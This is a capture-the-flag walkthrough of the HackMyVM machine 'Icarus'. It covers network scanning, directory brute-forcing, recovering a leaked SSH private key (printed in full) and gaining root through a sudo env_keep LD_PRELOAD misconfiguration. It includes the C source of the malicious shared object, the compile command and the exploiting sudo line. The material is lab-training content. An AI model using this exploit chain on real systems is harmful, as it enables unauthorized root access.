# ICARUS  -  HACK My Vm

## net discovery
```bash
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/icarus]
└─$ fping -ag 192.168.1.1/24 2>/dev/null
192.168.1.1
192.168.1.2
192.168.1.103
192.168.1.111
192.168.1.115
```

## Nmap
```bash
──(kali💀kali)-[~/Documents/CTF/hackmyvm/icarus]
└─$ nmap -A -sC -sV  -p-  192.168.1.115
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-16 08:48 EDT
Nmap scan report for icarus.hmv (192.168.1.115)
Host is up (0.00046s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b6:65:56:40:8d:a8:57:b9:15:1e:0e:1f:a5:d0:52:3a (RSA)
|   256 79:65:cb:2a:06:82:13:d3:76:6b:1c:55:cd:8f:07:b7 (ECDSA)
|_  256 b1:34:e5:21:a0:28:30:c0:6c:01:0e:b0:7b:8f:b8:c6 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: LOGIN
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.66 seconds
```

```
Got ssh and http port lets search some file in it  ...
```

## Gobuster
```bash
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/icarus]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -u 'http://192.168.1.115' -x php,txt,zip,bck,html,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.115
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip,bck,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 407]
/login.php            (Status: 302) [Size: 0] [--> index.php]
/xml                  (Status: 200) [Size: 1]
/a                    (Status: 200) [Size: 9641]
/xxx                  (Status: 200) [Size: 1]
/check.php            (Status: 200) [Size: 21]
/xsl                  (Status: 200) [Size: 1]
/xbl                  (Status: 200) [Size: 1]
/xap                  (Status: 200) [Size: 1]
/xav                  (Status: 200) [Size: 1]
/xss                  (Status: 200) [Size: 1]
/xor                  (Status: 200) [Size: 1]
```

```
Got lot of one bytes files so after testing lot of things 
there is a " /a " that contain all the payloads 
lets download them all to find some thing new

```
## For loop - downloading all the files .

```bash

┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/icarus]
└─$ for payload in $(cat ~/Downloads/a) ; wget http://192.168.1.115/$payload

#change  ~/Downloads/a to your path of /a that you downlaod  and change ip too and this loop will download  all the files .

```

```bash
cat * 


-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA5xagxLiN5ObhPjNcs2I2ckcYrErKaunOwm40kTBnJ6vrbdRYHteS
afNWC6xFFzwO77+Kze229eK4ddZcwmU0IdN02Y8nYrxhl8lOc+e5T0Ajz+tRmLGoxJVPsS
TzKBERlWpKuJoGO/CEFLOv6PP6s79YYzZFpdUjaczY96jgICftzNZS+VkBXuLjKr79h4Tw
z7BK4V6FEQY0hwT8NFfNrF3x3VPe0UstdiUJFl4QV/qAPlHVhPd0YUEPr/95mryjuGi1xw
P7xVFrYyjLfPepqYHiS5LZxFewLWhhSjBOI0dzf/TwiNRnVGTZhB3GemgEIQRAam26jkZZ
3BxkrUVckQAAA8jfk7Jp35OyaQAAAAdzc2gtcnNhAAABAQDnFqDEuI3k5uE+M1yzYjZyRx
isSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydi
vGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzN
j3qOAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX
+oA+UdWE93RhQQ+v/3mavKO4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9P
CI1GdUZNmEHcZ6aAQhBEBqbbqORlncHGStRVyRAAAAAwEAAQAAAQEAvdjwMU1xfTlUmPY3
VUP9ePsBwSIck6ML8t35H8KFLKln3C4USxpNNe/so+BeTo1PtBVHYpDFu9IMOvrl7+qW3q
dLGyUpdUtQXhPK+RvJONt30GwB+BEUlpQYCW9SuHr1WCwfwPMA5iNdT2ijvx0ZvKwZYECJ
DYlB87yQDz7VCnRTiQGP2Mqiiwb7vPd/t386Y+cAz1cVl7BnHzWWJTUTkKCwijnvjYrD0o
tTQX4sGd6CrI44g+L8hnYuCZz+a0j6IyUfXJqj6l+/Z2Af7pJjbJD3P28xX7eY0h1Cec2l
/sb7qg2wy0qJNywJ35l8bZzZKjkXztPLOqMFQ6Fh0BqSdQAAAIEAlaH0ZEzJsZoR3QqcKl
xRKjVcuQCwcrKlNbJu2qRuUG812CLb9jJxJxacJPBV0NS832c+hZ3BiLtA5FwCiGlGq5m5
HS3odf3lLXDfIK+pur4OWKBNLDxKbqi4s4M05vR4gHkmotiH9eWlCNuqL46Ip5H1vFXeJM
pLRLN0gqOGuQQAAACBAPfffuhidAgUZH/yTvATKC5lcGrE7bkpOq+6XMMgxEQl0Hzry76i
rGXkhTY4QUtthYo4+g7jiDzKlbeaS7aN8RYq38GzQnZZQcSdvL1yB/N554gQvzJLvmKQbm
gLhMRcdDmifUelJYXib2Mjg/BLaRXaEzOomUKR2nyJH7VgU+xzAAAAgQDuqkBp44indqhx
wrzbfeLnzQqpZ/rMZXGcvJUttECRbLRfohUftFE5J0PKuT8w0dpacNCVgkT9A0Tc3xRfky
ECBQjeKLvdhcufJhQl0pdXDt1cpebE50LE4yHc8vR6FEjhR4P2AbGICJyRS7AX7UnrOWdU
IE3FeNP0r5UiSDq16wAAAA1pY2FydXNAaWNhcnVzAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

```
we can get some information from private key  by below command that give us username 

ssh-keygen -y -f id_rsa
```

```bash

──(kali💀kali)-[~/Documents/CTF/hackmyvm/icarus]
└─$ ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnFqDEuI3k5uE+M1yzYjZyRxisSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydivGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzNj3qOAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX+oA+UdWE93RhQQ+v/3mavKO4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9PCI1GdUZNmEHcZ6aAQhBEBqbbqORlncHGStRVyR icarus@icarus

#found the username : icarus

```

# PRIV ESC - Root

```
got suspicious result from ( sudo -l )
env_keep+=LD_PRELOAD,
then i found a good article to exploit it . 

https://systemweakness.com/linux-privilege-escalation-with-ld-preload-sudo-a13e0b755ede

```

## c shell 
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {

	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

```
lets complite it and abuse ld_preload 
gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
change exploit with your shell name 

```

## Correct compiled result 
```bash
icarus@dhcppc15:/tmp$ gcc -fPIC -shared -nostartfiles -o shell.so shell.c
shell.c: In function ‘_init’:
shell.c:7:2: warning: implicit declaration of function ‘setgid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
  setgid(0);
  ^~~~~~
  setenv
shell.c:8:2: warning: implicit declaration of function ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
  setuid(0);
  ^~~~~~
  setenv

```

## exploit 

```bash
icarus@dhcppc15:/tmp$ sudo -l
sudo: unable to resolve host dhcppc15: Name or service not known
Matching Defaults entries for icarus on dhcppc15:
    env_reset, mail_badpass, env_keep+=LD_PRELOAD,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icarus may run the following commands on dhcppc15:
    (ALL : ALL) NOPASSWD: /usr/bin/id
```


```bash

#lets exploit it 
icarus@dhcppc15:/tmp$ sudo LD_PRELOAD=/tmp/shell.so id 
sudo: unable to resolve host dhcppc15: Name or service not known
# id
uid=0(root) gid=0(root) groups=0(root)
```



[references-preload-exploit ](https://systemweakness.com/linux-privilege-escalation-with-ld-preload-sudo-a13e0b755ede)
